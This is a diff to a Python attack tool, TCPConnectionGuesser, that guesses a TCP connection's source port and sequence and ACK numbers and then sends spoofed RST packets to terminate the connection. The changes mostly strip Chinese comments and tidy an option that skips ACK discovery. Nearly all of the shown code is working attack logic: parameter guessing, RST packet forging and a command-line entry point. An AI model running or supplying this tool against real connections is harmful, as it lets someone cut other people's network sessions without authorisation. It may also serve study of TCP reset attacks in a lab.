@@ -580,9 +580,8 @@ class TCPConnectionGuesser:
         print("[-] ACK number discovery failed")
         return False
 
-    def send_rst_attack(self, count=1, seq_variation=True, skip_ack_check=False): # 新增 skip_ack_check 參數
+    def send_rst_attack(self, count=1, seq_variation=True, skip_ack_check=False): 
         """Send RST packets to terminate the connection"""
-        # 根據 skip_ack_check 決定是否檢查 self.found_ack
         if self.found_port == -1 or self.found_seq == -1 or (not skip_ack_check and self.found_ack == -1):
             if skip_ack_check:
                 print("[-] Port or sequence number not found - cannot send RST.")
@@ -594,7 +593,6 @@ class TCPConnectionGuesser:
         print("SENDING RST ATTACK")
         print("=" * 60)
         print(f"Target Connection: {self.client_ip}:{self.found_port} -> {self.server_ip}:{self.server_port}")
-        # 根據 skip_ack_check 調整輸出訊息
         if not skip_ack_check:
             print(f"Using Client SEQ: {self.found_seq}, Client ACK: {self.found_ack}")
         else:
@@ -616,7 +614,7 @@ class TCPConnectionGuesser:
                 # Create RST packet from CLIENT to SERVER using client's sequence number
                 rst_packet = self.create_tcp_packet(
                     self.found_port, self.server_port,
-                    seq=seq_offset, ack=0, flags='R', payload='A' # RST 攻擊時 ACK 可以是 0
+                    seq=seq_offset, ack=0, flags='R', payload='A' 
                 )
                 packets.append(rst_packet)
         else:
@@ -625,7 +623,7 @@ class TCPConnectionGuesser:
                 # RST from CLIENT to SERVER using the discovered client sequence
                 rst_packet = self.create_tcp_packet(
                     self.found_port, self.server_port,
-                    seq=self.found_seq, ack=0, flags='R', payload='A' # RST 攻擊時 ACK 可以是 0
+                    seq=self.found_seq, ack=0, flags='R', payload='A' # ACK=0 when sending RST
                 )
                 packets.append(rst_packet)
          
@@ -638,7 +636,7 @@ class TCPConnectionGuesser:
          
         return True
 
-    def run_attack(self, send_rst=True, rst_count=5, skip_ack_finding=False): # 新增 skip_ack_finding 參數
+    def run_attack(self, send_rst=True, rst_count=5, skip_ack_finding=False): 
         """Run the complete attack sequence"""
         print("TCP CONNECTION PARAMETER GUESSER & RST ATTACK")
         print("=" * 60)
@@ -662,14 +660,13 @@ class TCPConnectionGuesser:
                 return False
              
             # Phase 3: Find ACK number (可選)
-            if not skip_ack_finding: # 根據 skip_ack_finding 決定是否執行 ACK 尋找
+            if not skip_ack_finding: 
                 if not self.find_ack_number():
                     return False
             else:
                 print("\n" + "=" * 60)
                 print("PHASE 3: ACK NUMBER DISCOVERY (SKIPPED)")
                 print("=" * 60)
-                # 如果跳過，給 self.found_ack 一個預設值，雖然 RST 不完全需要它，但防止程式其他部分出錯
                 self.found_ack = 0
                 print("[*] ACK number discovery skipped as requested.")
              
@@ -684,7 +681,7 @@ class TCPConnectionGuesser:
             print(f"Server IP: {self.server_ip}")
             print(f"Server Port: {self.server_port}")
             print(f"Sequence Number: {self.found_seq}")
-            if not skip_ack_finding: # 根據是否跳過 ACK 顯示訊息
+            if not skip_ack_finding: 
                 print(f"ACK Number: {self.found_ack}")
             else:
                 print(f"ACK Number: (ACK finding skipped)")
@@ -696,7 +693,6 @@ class TCPConnectionGuesser:
             # Phase 4: Send RST attack
             if send_rst:
                 time.sleep(1)  # Brief pause before attack
-                # 將 skip_ack_check 參數傳遞給 send_rst_attack
                 self.send_rst_attack(count=rst_count, seq_variation=True, skip_ack_check=skip_ack_finding) 
              
             return True
@@ -715,7 +711,6 @@ def main():
     parser.add_argument('--packet-repeat', type=int, default=1, help='Packets per test')
     parser.add_argument('--no-rst', action='store_true', help='Skip RST attack after discovery')
     parser.add_argument('--rst-count', type=int, default=5, help='Number of RST packets to send')
-    # 新增 --skip-ack 參數
     parser.add_argument('--skip-ack', action='store_true', help='Skip ACK number discovery (RST only needs SEQ)')
      
     args = parser.parse_args()
@@ -734,7 +729,7 @@ def main():
         success = guesser.run_attack(
             send_rst=not args.no_rst, 
             rst_count=args.rst_count,
-            skip_ack_finding=args.skip_ack # 傳遞新的參數
+            skip_ack_finding=args.skip_ack
         )
          
         if success:
